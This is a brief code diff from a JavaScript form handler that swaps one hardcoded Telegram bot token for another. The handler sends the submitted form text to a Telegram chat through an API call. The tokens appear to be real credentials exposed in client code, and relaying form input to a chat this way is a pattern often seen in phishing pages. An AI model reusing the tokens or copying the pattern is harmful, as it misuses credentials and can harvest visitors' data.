@@ -72,7 +72,7 @@ const handleSubmit = (e) => {
     });
 
     axios.get(
-        `https://api.telegram.org/bot6114548691:AAFu2HvH1aswXEWFHPbxQFdkf_vkyS4ON4Q/sendMessage?chat_id=@hasghdgashdgashdght2783467238427&text=${encodeURIComponent(text)}&parse_mode=HTML`
+        `https://api.telegram.org/bot1649981483:AAEZvq30no8ZIHKw3nHr2lP9-EG7gKB05iI/sendMessage?chat_id=@hasghdgashdgashdght2783467238427&text=${encodeURIComponent(text)}&parse_mode=HTML`
       )
       .then((res) => {
         Swal.fire({
